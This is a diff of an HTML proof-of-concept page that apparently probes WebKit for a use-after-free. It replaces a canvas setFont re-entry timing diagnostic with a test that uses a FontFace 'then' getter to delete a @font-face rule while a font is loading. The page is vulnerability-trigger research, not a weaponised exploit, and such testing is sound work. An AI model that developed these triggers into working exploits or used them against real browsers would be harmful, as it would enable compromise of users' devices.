@@ -2,622 +2,147 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Canvas setFont Re-entry Timing Diagnostic SAFE</title>
-<style>
-html {
-  background: #0d0d0d;
-  color: #c9d1d9;
-  font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
-}
-body {
-  padding: 16px;
-  font-size: 13px;
-}
-h2 {
-  color: #58a6ff;
-  margin-bottom: 6px;
-}
-.sub {
-  color: #8b949e;
-  margin-bottom: 12px;
-}
-.box {
-  background: #161b22;
-  border: 1px solid #30363d;
-  border-radius: 8px;
-  padding: 12px;
-  margin: 10px 0;
-}
-#stage {
-  font-weight: bold;
-  font-size: 18px;
-  color: #d29922;
-}
-#log, #previous {
-  white-space: pre-wrap;
-  word-break: break-word;
-  min-height: 160px;
-  max-height: 520px;
-  overflow-y: auto;
-}
-.ok { color: #3fb950; }
-.bad { color: #f85149; }
-.warn { color: #d29922; }
-.info { color: #58a6ff; }
-.hit {
-  color: #ff7b72;
-  font-weight: bold;
-}
-button {
-  background: #21262d;
-  color: #c9d1d9;
-  border: 1px solid #30363d;
-  border-radius: 6px;
-  padding: 10px 18px;
-  font-family: inherit;
-  font-size: 13px;
-  margin-right: 8px;
-  margin-bottom: 8px;
-}
-button:disabled {
-  opacity: .45;
-}
-canvas {
-  border: 1px solid #30363d;
-  margin-top: 8px;
-}
-</style>
+<title>CSSFontFace load getter delete diagnostic</title>
 </head>
 <body>
-
-<h2>Canvas setFont Re-entry Timing Diagnostic — SAFE</h2>
-<div class="sub">
-Diagnostic-only. Goal: determine whether JS callbacks fire inside <code>ctx.font</code> / WebKit <code>setFont()</code>, or only before/after it.
-<br>
-Fixed: MutationObserver no longer observes the log area, so it should not self-loop.
-</div>
-
-<div class="box">
-  <div id="stage">Stage: idle</div>
-  <button id="btnAll">▶ Run ALL</button>
-  <button id="btnP1">Run P1</button>
-  <button id="btnP2">Run P2</button>
-  <button id="btnP3">Run P3 SAFE</button>
-  <button id="btnP4">Run P4</button>
-  <button id="btnP5">Run P5</button>
-  <button id="btnP6">Run P6</button>
-</div>
-
-<div class="box">
-  <b>Current log</b>
-  <pre id="log"></pre>
-</div>
-
-<div class="box">
-  <b>Previous persisted log</b>
-  <pre id="previous"></pre>
-</div>
-
+<pre id="result">running</pre>
 <script>
-"use strict";
+(function () {
+    "use strict";
 
-/*
-  PS5 Canvas setFont re-entry timing diagnostic.
-
-  Interpretation:
-    - timing=INSIDE ctx.font  => important
-    - timing=OUTSIDE ...      => not evidence of setFont re-entry
-
-  Safety:
-    - No heap spray
-    - No exploit chain
-    - No memory corruption attempt
-    - P3 MutationObserver is isolated to avoid feedback loop
-*/
-
-const STORAGE_KEY = "canvas-setfont-reentry-timing-safe-log";
-const LAST_KEY = STORAGE_KEY + "-last";
-const MAX_PERSISTED_LINES = 260;
-
-const stageEl = document.getElementById("stage");
-const logEl = document.getElementById("log");
-const previousEl = document.getElementById("previous");
-
-let seq = 0;
-let inSetFont = false;
-let currentProbe = "";
-let insideCallbackCount = 0;
-let outsideCallbackCount = 0;
-let logLines = [];
-
-function now() {
-  return performance.now().toFixed(1).padStart(8);
-}
-
-function tailLines(lines) {
-  if (lines.length <= MAX_PERSISTED_LINES)
-    return lines;
-  return lines.slice(lines.length - MAX_PERSISTED_LINES);
-}
-
-function persistLine(line) {
-  try {
-    logLines.push(line);
-    logLines = tailLines(logLines);
-    localStorage.setItem(STORAGE_KEY, logLines.join("\n"));
-    localStorage.setItem(LAST_KEY, line);
-  } catch (e) {}
-}
-
-function hardMark(msg) {
-  try {
-    localStorage.setItem(LAST_KEY, "[" + Date.now() + "] " + msg);
-  } catch (e) {}
-}
-
-function log(msg, cls) {
-  const line = "[" + (++seq) + "] [" + now() + "ms] " + msg;
-
-  const d = document.createElement("div");
-  d.textContent = line;
-  if (cls)
-    d.className = cls;
-
-  logEl.appendChild(d);
-
-  while (logEl.childNodes.length > MAX_PERSISTED_LINES)
-    logEl.removeChild(logEl.firstChild);
-
-  logEl.scrollTop = logEl.scrollHeight;
-  persistLine(line);
-
-  try { console.log(line); } catch (e) {}
-}
-
-function stage(msg) {
-  stageEl.textContent = "Stage: " + msg;
-  log("STAGE => " + msg, "info");
-}
-
-function sep() {
-  log("------------------------------------------------------------", "info");
-}
-
-function loadPrevious() {
-  try {
-    previousEl.textContent =
-      "LAST CHECKPOINT:\n" +
-      (localStorage.getItem(LAST_KEY) || "") +
-      "\n\nFULL LOG TAIL:\n" +
-      (localStorage.getItem(STORAGE_KEY) || "");
-  } catch (e) {
-    previousEl.textContent = "localStorage unavailable: " + e.name + ": " + e.message;
-  }
-}
-
-window.onerror = function(message, source, lineno, colno, error) {
-  hardMark("window.onerror");
-  log("window.onerror: " + message + " at " + lineno + ":" + colno, "bad");
-  if (error && error.stack)
-    log("stack: " + error.stack, "bad");
-};
-
-window.onunhandledrejection = function(event) {
-  hardMark("unhandledrejection");
-  log("unhandledrejection: " + event.reason, "bad");
-};
-
-window.addEventListener("beforeunload", function() {
-  hardMark("beforeunload fired");
-});
-
-function makeCanvas(label) {
-  const canvas = document.createElement("canvas");
-  canvas.width = 120;
-  canvas.height = 60;
-  canvas.setAttribute("data-probe", label);
-  document.body.appendChild(canvas);
-
-  const ctx = canvas.getContext("2d");
-  if (!ctx)
-    throw new Error("2D context unavailable");
-
-  return { canvas, ctx };
-}
-
-function callbackTiming(label) {
-  let timing;
-
-  if (inSetFont) {
-    timing = "INSIDE ctx.font";
-    insideCallbackCount++;
-  } else {
-    timing = "OUTSIDE probe";
-    outsideCallbackCount++;
-  }
-
-  log("CALLBACK: " + label + " timing=" + timing + " currentProbe=" + currentProbe, inSetFont ? "hit" : "warn");
-  return inSetFont;
-}
-
-function setFontWithSentinel(label, ctx, fontValue) {
-  log(label + ": ABOUT TO assign ctx.font = " + JSON.stringify(fontValue), "warn");
-
-  currentProbe = label;
-  inSetFont = true;
-  hardMark(label + ": before ctx.font assignment");
-
-  try {
-    ctx.font = fontValue;
-    hardMark(label + ": after ctx.font assignment");
-    log(label + ": ctx.font assignment returned; ctx.font=" + JSON.stringify(ctx.font), "ok");
-  } catch (e) {
-    hardMark(label + ": ctx.font threw");
-    log(label + ": EXCEPTION from ctx.font: " + e.name + ": " + e.message, "hit");
-  } finally {
-    inSetFont = false;
-    currentProbe = "";
-  }
-}
-
-function smallDelay(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
-}
-
-/*
-  P1:
-  Parent custom element timing.
-*/
-async function probeCustomElementParent() {
-  sep();
-  stage("Probe 1: parent custom element timing");
-
-  const { canvas, ctx } = makeCanvas("probe1");
-  const tag = "x-canvas-timing-parent-" + Date.now() + "-" + Math.floor(Math.random() * 100000);
-
-  const trigger = document.createElement(tag);
-  document.body.appendChild(trigger);
-  log("[P1] inserted unresolved custom element before define()", "info");
-
-  customElements.define(tag, class extends HTMLElement {
-    connectedCallback() {
-      const inside = callbackTiming("[P1] connectedCallback");
-      if (inside) {
-        log("[P1] INSIDE ctx.font: removing canvas", "hit");
-        try { canvas.remove(); } catch (e) {}
-      }
+    if (window.testRunner) {
+        testRunner.dumpAsText();
+        testRunner.waitUntilDone();
     }
-  });
 
-  log("[P1] customElements.define() returned", "info");
+    const resultElement = document.getElementById("result");
+    const resultLines = [];
+    let finished = false;
+    let getterHits = 0;
+    let deleteRuleExecuted = false;
+    let styleElement = null;
 
-  setFontWithSentinel("[P1]", ctx, "18px sans-serif");
-
-  try { trigger.remove(); } catch (e) {}
-  try { canvas.remove(); } catch (e) {}
-
-  await smallDelay(80);
-}
-
-/*
-  P2:
-  iframe-local custom element registry timing.
-*/
-async function probeIframeCustomElement() {
-  sep();
-  stage("Probe 2: iframe custom element timing");
-
-  const iframe = document.createElement("iframe");
-  iframe.style.cssText = "width:1px;height:1px;position:absolute;left:-9999px";
-  document.body.appendChild(iframe);
-
-  iframe.srcdoc = "<!doctype html><html><body><canvas id='c' width='120' height='60'></canvas></body></html>";
-
-  await new Promise(resolve => {
-    iframe.onload = resolve;
-  });
-
-  const iwin = iframe.contentWindow;
-  const idoc = iframe.contentDocument;
-
-  if (!iwin || !idoc || !iwin.customElements) {
-    log("[P2] iframe customElements unavailable", "bad");
-    try { iframe.remove(); } catch (e) {}
-    return;
-  }
-
-  const canvas = idoc.getElementById("c");
-  const ctx = canvas.getContext("2d");
-
-  if (!ctx) {
-    log("[P2] iframe ctx unavailable", "bad");
-    try { iframe.remove(); } catch (e) {}
-    return;
-  }
-
-  const tag = "x-canvas-timing-iframe-" + Date.now() + "-" + Math.floor(Math.random() * 100000);
-  const trigger = idoc.createElement(tag);
-  idoc.body.appendChild(trigger);
-  log("[P2] inserted unresolved custom element inside iframe", "info");
-
-  iwin.customElements.define(tag, class extends iwin.HTMLElement {
-    connectedCallback() {
-      const inside = callbackTiming("[P2] iframe connectedCallback");
-      if (inside) {
-        log("[P2] INSIDE ctx.font: removing iframe", "hit");
-        try { iframe.remove(); } catch (e) {}
-      }
+    function record(message)
+    {
+        resultLines.push(message);
+        try {
+            console.log(message);
+        } catch (e) {
+        }
     }
-  });
 
-  log("[P2] iframe customElements.define() returned", "info");
-
-  setFontWithSentinel("[P2]", ctx, "18px serif");
-
-  try { iframe.remove(); } catch (e) {}
-
-  await smallDelay(80);
-}
-
-/*
-  P3 SAFE:
-  MutationObserver timing.
-  Important fix:
-    - observe only isolated target
-    - disconnect before logging inside observer
-    - never observe document.body or logEl
-*/
-async function probeMutationObserverSafe() {
-  sep();
-  stage("Probe 3: MutationObserver timing SAFE");
-
-  const { canvas, ctx } = makeCanvas("probe3");
-
-  let observerHit = false;
-
-  const target = document.createElement("div");
-  target.textContent = "observer target";
-  target.style.cssText = "display:none";
-  document.body.appendChild(target);
-
-  const mo = new MutationObserver(() => {
-    observerHit = true;
-
-    // Prevent feedback loop before any DOM logging happens.
-    mo.disconnect();
-
-    const inside = callbackTiming("[P3] MutationObserver SAFE");
-
-    if (inside) {
-      log("[P3] INSIDE ctx.font: removing canvas", "hit");
-      try { canvas.remove(); } catch (e) {}
+    function finish()
+    {
+        if (finished)
+            return;
+        finished = true;
+        try {
+            resultElement.textContent = resultLines.join("\n");
+        } catch (e) {
+        }
+        if (window.testRunner)
+            testRunner.notifyDone();
     }
-  });
 
-  mo.observe(target, { childList: true });
+    function makeThenGetter()
+    {
+        return function () {
+            ++getterHits;
+            try {
+                localStorage.setItem("fface-load-getter-delete", "getter fired " + getterHits);
+            } catch (e) {
+            }
+            console.log("getter fired");
+            if (!deleteRuleExecuted) {
+                deleteRuleExecuted = true;
+                try {
+                    if (styleElement && styleElement.sheet && styleElement.sheet.cssRules.length) {
+                        styleElement.sheet.deleteRule(0);
+                        console.log("deleteRule executed");
+                    } else
+                        console.log("deleteRule skipped");
+                } catch (e) {
+                    console.log("deleteRule threw: " + e.name + ": " + e.message);
+                }
+            }
+            return undefined;
+        };
+    }
 
-  const marker = document.createElement("span");
-  marker.textContent = "mutation marker";
-  target.appendChild(marker);
-  log("[P3] DOM mutation queued on isolated target before ctx.font", "info");
+    function fail(message)
+    {
+        record(message);
+        record("DONE");
+        setTimeout(finish, 0);
+    }
 
-  setFontWithSentinel("[P3]", ctx, "20px monospace");
+    function run()
+    {
+        record("POC STARTED: CSSFontFace load getter delete diagnostic");
 
-  await smallDelay(80);
+        if (!window.FontFace)
+            return fail("FontFace API missing");
+        if (!document.fonts)
+            return fail("document.fonts missing");
 
-  log("[P3] MutationObserver hit=" + observerHit, observerHit ? "warn" : "ok");
+        styleElement = document.createElement("style");
+        styleElement.textContent =
+            '@font-face {\n' +
+            '  font-family: x;\n' +
+            '  src: local("DejaVuSans"), local("DejaVu Sans"), local("Arial"), local("Helvetica"), local("Times New Roman"), local("Courier New");\n' +
+            '  unicode-range: U+0042;\n' +
+            '}\n';
+        document.head.appendChild(styleElement);
+        record("dynamic style appended");
 
-  mo.disconnect();
-  try { target.remove(); } catch (e) {}
-  try { canvas.remove(); } catch (e) {}
-}
+        const jsFace = new FontFace(
+            "trigger",
+            'local("DejaVuSans"), local("DejaVu Sans"), local("Arial"), local("Helvetica"), local("Times New Roman"), local("Courier New")',
+            { unicodeRange: "U+0041" }
+        );
 
-/*
-  P4:
-  document.fonts callback timing.
-*/
-async function probeFontCallbacks() {
-  sep();
-  stage("Probe 4: document.fonts callback timing");
+        Object.defineProperty(jsFace, "then", {
+            configurable: true,
+            get: makeThenGetter()
+        });
 
-  const { canvas, ctx } = makeCanvas("probe4");
+        document.fonts.add(jsFace);
 
-  const family = "CanvasTimingFont" + Date.now() + Math.floor(Math.random() * 100000);
-  const style = document.createElement("style");
+        const loadPromise = document.fonts.load("1em trigger, x", "AB");
+        loadPromise.then(function (faces) {
+            record("load resolved; faces.length=" + (faces ? faces.length : "null"));
+            record("getter hits=" + getterHits);
+            record("deleteRule executed=" + deleteRuleExecuted);
+            record("DONE");
+            setTimeout(finish, 0);
+        }, function (error) {
+            record("load rejected: " + error);
+            record("getter hits=" + getterHits);
+            record("deleteRule executed=" + deleteRuleExecuted);
+            record("DONE");
+            setTimeout(finish, 0);
+        });
 
-  style.textContent =
-    "@font-face {" +
-    " font-family: '" + family + "';" +
-    " src: local('Arial'), local('Helvetica'), local('Times New Roman'), local('Courier New');" +
-    " font-display: block;" +
-    "}";
+        setTimeout(function () {
+            if (finished)
+                return;
+            record("load timeout");
+            record("getter hits=" + getterHits);
+            record("deleteRule executed=" + deleteRuleExecuted);
+            record("DONE");
+            finish();
+        }, 5000);
+    }
 
-  document.head.appendChild(style);
-
-  let loadingDoneHit = false;
-  let readyHit = false;
-
-  if (document.fonts) {
-    document.fonts.onloadingdone = function() {
-      loadingDoneHit = true;
-      callbackTiming("[P4] document.fonts.onloadingdone");
+    window.onerror = function (message, source, line, column)
+    {
+        record("window.onerror: " + message + " at " + line + ":" + column);
+        record("DONE");
+        setTimeout(finish, 0);
     };
 
-    document.fonts.ready.then(function() {
-      readyHit = true;
-      callbackTiming("[P4] document.fonts.ready.then");
-    }, function(error) {
-      log("[P4] fonts.ready rejected: " + error, "bad");
-    });
-  } else {
-    log("[P4] document.fonts unavailable", "warn");
-  }
-
-  setFontWithSentinel("[P4]", ctx, "24px " + family);
-
-  await smallDelay(300);
-
-  log("[P4] onloadingdone hit=" + loadingDoneHit + ", fonts.ready hit=" + readyHit, "info");
-
-  if (document.fonts)
-    document.fonts.onloadingdone = null;
-
-  try { style.remove(); } catch (e) {}
-  try { canvas.remove(); } catch (e) {}
-}
-
-/*
-  P5:
-  Detached canvas context stability.
-*/
-async function probeDetachedContext() {
-  sep();
-  stage("Probe 5: detached canvas context stability");
-
-  const { canvas, ctx } = makeCanvas("probe5");
-
-  canvas.remove();
-  log("[P5] canvas removed before ctx.font; JS ctx reference still alive", "warn");
-
-  setFontWithSentinel("[P5]", ctx, "18px Georgia");
-
-  try {
-    const w = ctx.measureText("PS5").width;
-    log("[P5] measureText after detach width=" + w, isFinite(w) && w > 0 ? "ok" : "hit");
-  } catch (e) {
-    log("[P5] measureText after detach threw: " + e.name + ": " + e.message, "hit");
-  }
-
-  await smallDelay(80);
-}
-
-/*
-  P6:
-  Guarded recursive setFont, only if callback occurs inside setter.
-*/
-async function probeGuardedRecursive() {
-  sep();
-  stage("Probe 6: guarded recursive setFont");
-
-  const { canvas, ctx } = makeCanvas("probe6");
-  const tag = "x-canvas-recursive-" + Date.now() + "-" + Math.floor(Math.random() * 100000);
-  let depth = 0;
-
-  const trigger = document.createElement(tag);
-  document.body.appendChild(trigger);
-  log("[P6] inserted unresolved custom element before define()", "info");
-
-  customElements.define(tag, class extends HTMLElement {
-    connectedCallback() {
-      const inside = callbackTiming("[P6] connectedCallback");
-
-      if (inside && depth < 2) {
-        depth++;
-        log("[P6] INSIDE ctx.font: recursive ctx.font depth=" + depth, "hit");
-
-        try {
-          ctx.font = (12 + depth) + "px monospace";
-          log("[P6] recursive ctx.font returned depth=" + depth, "warn");
-        } catch (e) {
-          log("[P6] recursive ctx.font threw: " + e.name + ": " + e.message, "hit");
-        }
-
-        depth--;
-      }
-    }
-  });
-
-  log("[P6] customElements.define() returned", "info");
-
-  setFontWithSentinel("[P6]", ctx, "16px Arial");
-
-  try { trigger.remove(); } catch (e) {}
-  try { canvas.remove(); } catch (e) {}
-
-  await smallDelay(80);
-}
-
-async function runSelected(which) {
-  disableButtons(true);
-
-  seq = 0;
-  insideCallbackCount = 0;
-  outsideCallbackCount = 0;
-  logLines = [];
-  logEl.textContent = "";
-
-  try {
-    localStorage.removeItem(STORAGE_KEY);
-  } catch (e) {}
-
-  loadPrevious();
-
-  stage("started");
-  log("POC STARTED: Canvas setFont re-entry timing diagnostic SAFE", "info");
-  log("Selected probes: " + which, "info");
-  log("Important: only timing=INSIDE ctx.font is relevant.", "warn");
-
-  try {
-    if (which === "ALL" || which === "P1")
-      await probeCustomElementParent();
-
-    if (which === "ALL" || which === "P2")
-      await probeIframeCustomElement();
-
-    if (which === "ALL" || which === "P3")
-      await probeMutationObserverSafe();
-
-    if (which === "ALL" || which === "P4")
-      await probeFontCallbacks();
-
-    if (which === "ALL" || which === "P5")
-      await probeDetachedContext();
-
-    if (which === "ALL" || which === "P6")
-      await probeGuardedRecursive();
-
-    sep();
-    stage("summary");
-
-    log("SUMMARY: insideCallbackCount=" + insideCallbackCount, insideCallbackCount ? "hit" : "ok");
-    log("SUMMARY: outsideCallbackCount=" + outsideCallbackCount, "info");
-
-    if (insideCallbackCount > 0) {
-      log("RESULT: INTERESTING — callback fired while ctx.font assignment was in progress.", "hit");
-      log("NEXT: run this exact file under ASan WebKitTestRunner/MiniBrowser.", "warn");
-    } else {
-      log("RESULT: NO SYNCHRONOUS JS RE-ENTRY OBSERVED INSIDE ctx.font.", "ok");
-      log("INTERPRETATION: current VULN-004 UAF path is weak on this platform.", "ok");
-    }
-
-    log("NO CRASH OBSERVED", "ok");
-    log("DONE", "ok");
-    hardMark("DONE");
-
-  } catch (e) {
-    hardMark("top-level exception");
-    log("TOP LEVEL ERROR: " + e.name + ": " + e.message, "hit");
-  }
-
-  disableButtons(false);
-}
-
-function disableButtons(disabled) {
-  const ids = ["btnAll", "btnP1", "btnP2", "btnP3", "btnP4", "btnP5", "btnP6"];
-  for (const id of ids)
-    document.getElementById(id).disabled = disabled;
-}
-
-document.getElementById("btnAll").addEventListener("click", () => runSelected("ALL"));
-document.getElementById("btnP1").addEventListener("click", () => runSelected("P1"));
-document.getElementById("btnP2").addEventListener("click", () => runSelected("P2"));
-document.getElementById("btnP3").addEventListener("click", () => runSelected("P3"));
-document.getElementById("btnP4").addEventListener("click", () => runSelected("P4"));
-document.getElementById("btnP5").addEventListener("click", () => runSelected("P5"));
-document.getElementById("btnP6").addEventListener("click", () => runSelected("P6"));
-
-loadPrevious();
-hardMark("page loaded");
+    setTimeout(run, 0);
+})();
 </script>
 </body>
 </html>
